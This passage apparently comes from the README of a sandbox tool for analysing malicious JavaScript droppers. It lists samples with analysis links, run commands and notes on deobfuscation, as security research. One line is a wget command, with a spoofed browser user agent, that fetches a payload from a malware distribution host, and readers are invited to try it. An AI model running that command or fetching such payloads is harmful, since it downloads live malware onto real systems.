**Output 1st stage:** [malware/20161013/802577e503bd1880e57b3bd3d3ed047d90a0f0aa0dee89a04a90944fc1f74f27.out](malware/20161013/802577e503bd1880e57b3bd3d3ed047d90a0f0aa0dee89a04a90944fc1f74f27.out)
**Output 2nd stage:** [malware/20161013/_TMP__XipXkrLd.out](malware/20161013/_TMP__XipXkrLd.out)

## firefox-patch.js ##

This one is downloading the **2nd javascript stage** from a remote server. Quite rare. Unfortunatelly the remote server is no
longer returning the payload.

Note the SyntaxError is beacause the server does not return a valid payload anymore:

    8 Oct 20:53:44 - MSXML2.XMLHTTP[9].ResponseText.get() => (string) '<html>??<head><title>404 Not Found</title></head>??<body bgcolor="white">??<center><h1>404 Not Found ... (truncated)'
    8 Oct 20:53:44 - Strict mode: false
    8 Oct 20:53:44 - Calling eval() no.: 3
    8 Oct 20:53:44 - Exception occured: object SyntaxError: Invalid or unexpected token
        at eval (env/eval.js:24:12)
            at eval (eval at eval (env/eval.js:24:12), <anonymous>:1:2178)

**malwr.com:** https://malwr.com/analysis/NTkwMTFiYTZkODdlNDI4ZThjOGZiYTBlNWM1YzczMWU/

**Source code:** malware/20161008/140da02684fd276b6c989317c8ba13f066373dc2623153776da5b8a3e4c7a59f.js

**Command:**

    node jailme.js --down=y malware/20161008/140da02684fd276b6c989317c8ba13f066373dc2623153776da5b8a3e4c7a59f.js

**Output:** [malware/20161008/140da02684fd276b6c989317c8ba13f066373dc2623153776da5b8a3e4c7a59f.out](malware/20161008/140da02684fd276b6c989317c8ba13f066373dc2623153776da5b8a3e4c7a59f.out)

## factuur_897239.js ##

Here we are unable to download the payload as the remote server uses 301 HTTP response, which is not handled by the 
underlying XMLHTTPRequest in sync mode. Alhough deobfuscation runs just fine, so you can download the payload manually.

**malwr.com:** https://malwr.com/analysis/MTdhMjkxZDRlMzRmNDEzM2JiYTllMDBjNzkxYTQxYWU/

**Source code:** malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js

**Command:**

    node jailme.js --down=y malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js

**Output:** [malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.out](malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.out)


## malware.js ##

Pretending to be a game. Interesting deobfuscation procedure. 

**malwr.com:** https://malwr.com/analysis/OTE3MDcwOGVhZjc3NDA0ZmFjNTk0ZjljMDc4NGM2YjQ/

**Source code:** malware/20161005/dbf6e041cf2431018b977f734db844a2d731dd25cc3debabbfcfa8c529ce2a77.js

**Command:**

    node jailme.js --down=y malware/20161005/dbf6e041cf2431018b977f734db844a2d731dd25cc3debabbfcfa8c529ce2a77.js

**Output:** [malware/20161005/dbf6e041cf2431018b977f734db844a2d731dd25cc3debabbfcfa8c529ce2a77.out](malware/20161005/dbf6e041cf2431018b977f734db844a2d731dd25cc3debabbfcfa8c529ce2a77.out)

## USBPRO1.JS ##

Using ScriptControl to deobfuscate an hexa array into a VBScript code.

**malwr.com:** https://malwr.com/analysis/NWFjMGY0OWVhZDIzNDA3Y2I4OGIwOTFlZGIwYWY4ZGY/

**Source code:** malware/20161003/86943c7e77aac9a3db09def4cdd038f7707fde04d8af59245463dceef5cccc51.js

**Command:**

    node jailme.js malware/20161003/86943c7e77aac9a3db09def4cdd038f7707fde04d8af59245463dceef5cccc51.js

**Output:** [malware/20161003/86943c7e77aac9a3db09def4cdd038f7707fde04d8af59245463dceef5cccc51.out](malware/20161003/86943c7e77aac9a3db09def4cdd038f7707fde04d8af59245463dceef5cccc51.out)

## ORDER-12874.js ##

This one is a strange one. 

I had to modify the malware and increase deobfuscating XOR key named 'XHZGH' by 2 
to make the deobfuscation work. Maybe it targets German systems only, where "TypeError" translates to "Eingabefehler" and 
'e' = ASCII 101 is less then 'g' = ASCII 103 exactly by 2.  

Compare the **original** and **modified** version of the malware. 

Also the payload finally downloaded has 0 length. Maybe the server uses IP geolocations. I cannot verify as I'm not in Germany.
Anybody from Germany may try:

    wget -d --header="User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" http://instalseds.bid/admin.php?f=403


**malwr.com:** https://malwr.com/analysis/Y2NjN2I4NTlkZjIyNDFkYzljZDZkNDY3OWIzMmRlYjY/

**Source code original:** malware/20161002/ac5705ba4eeb9295b162073cdccf64b9a0a14fd3bf933694e083aab2e65820e9.js.orig

**Source code modified:** malware/20161002/ac5705ba4eeb9295b162073cdccf64b9a0a14fd3bf933694e083aab2e65820e9.js

**Command:** 

     node jailme.js --down=y malware/20161002/ac5705ba4eeb9295b162073cdccf64b9a0a14fd3bf933694e083aab2e65820e9.js

**Output:** [malware/20161002/ac5705ba4eeb9295b162073cdccf64b9a0a14fd3bf933694e083aab2e65820e9.out](malware/20161002/ac5705ba4eeb9295b162073cdccf64b9a0a14fd3bf933694e083aab2e65820e9.out)


## Norri.js ##

**malwr.com:** https://malwr.com/analysis/Mjc0ZjUyMjZhYzg4NDJlYmEwNzBkMTAxODA5NGYwZGM/

**Source code:** malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.js

**Command:** 

     node jailme.js --down=y malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.js

**Output:** [malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.out](malware/20160929/cb7fc381f6f7600ca0060764ae117482cae3a0fa02db4467604a55c57d069124.out)

## ORDER-10455.js ##

This one has very long and nice deobfuscation. Same like ORDER-19586.js

**malwr.com:** https://malwr.com/analysis/NDU1ZDA4NmY3ZGUyNDczZjg0ODU2OGZiZTMxNjA5NzE/

**Source code:** malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.js

**Command:** 

     node jailme.js --down=y malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.js

**Output:** [malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.out](malware/20160929/416e32e1b22ecb8f360ff841b87d77ac9450fda24458ce4e70abb35ff4d242a3.out)

## N750991284.js ##

**malwr.com:** https://malwr.com/analysis/MzdlYThhNGE0NTZkNGRiMjg4MmE0ZTFmZjMyNTQyYzg/

**Source code:** malware/20161001/f51943c5860e548138991b991abecaa175353c80ab3ea91b3d1fbb5a4feb42f4.js

**Command:**

    node jailme.js --down=y malware/20161001/f51943c5860e548138991b991abecaa175353c80ab3ea91b3d1fbb5a4feb42f4.js
    
**Output:** [malware/20161001/f51943c5860e548138991b991abecaa175353c80ab3ea91b3d1fbb5a4feb42f4.js](malware/20161001/f51943c5860e548138991b991abecaa175353c80ab3ea91b3d1fbb5a4feb42f4.js)

## Wileen.js ##

**malwr.com:** https://malwr.com/analysis/NTVkZDQ4MGZkZWE4NDAyM2EwODEyMDM3MDhjMDI1MTQ/

**Source code:** malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.js

**Command:**

    node jailme.js --down=y -c ./config_wscript_only.json  malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.js
    
**Output:** [malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.out](malware/20161001/a6dfd6b83d46702c0b408bd5f669e08c785cd12fdd515fe469595e2a3d44ddc4.out)

## ORDER-19586.js ##

This one has very long and nice deobfuscation.

**malwr.com:** https://malwr.com/analysis/YmQ1Y2M1YjAxNGY0NGRlNjllODI4N2Y0MGYzYmI3ZGM/

**Source code:** malware/20161001/cfb2d04891156bffb08ad15188f9dbbd9e7379b0a571fd50128116904873e238.js

**Command:**

    node jailme.js --down=y malware/20161001/cfb2d04891156bffb08ad15188f9dbbd9e7379b0a571fd50128116904873e238.js

**Output:** [malware/20161001/cfb2d04891156bffb08ad15188f9dbbd9e7379b0a571fd50128116904873e238.out](malware/20161001/cfb2d04891156bffb08ad15188f9dbbd9e7379b0a571fd50128116904873e238.out)

## signed doc 5194.js ##

**malwr.com:** https://malwr.com/analysis/ZTA4ZDk5MDNiN2VjNDk4ZDgwOTU4NDBmYTAxZDVmOWI/

**Source code:** malware/20160531/8d1c45e37b97fcd061f52a5d7ab73476ab80520df58514eb7e091852d2d43b04.js

**Command:**

     node jailme.js --down=y malware/20160531/8d1c45e37b97fcd061f52a5d7ab73476ab80520df58514eb7e091852d2d43b04.js

**Output:** [malware/20160531/8d1c45e37b97fcd061f52a5d7ab73476ab80520df58514eb7e091852d2d43b04.out](malware/20160531/8d1c45e37b97fcd061f52a5d7ab73476ab80520df58514eb7e091852d2d43b04.out)
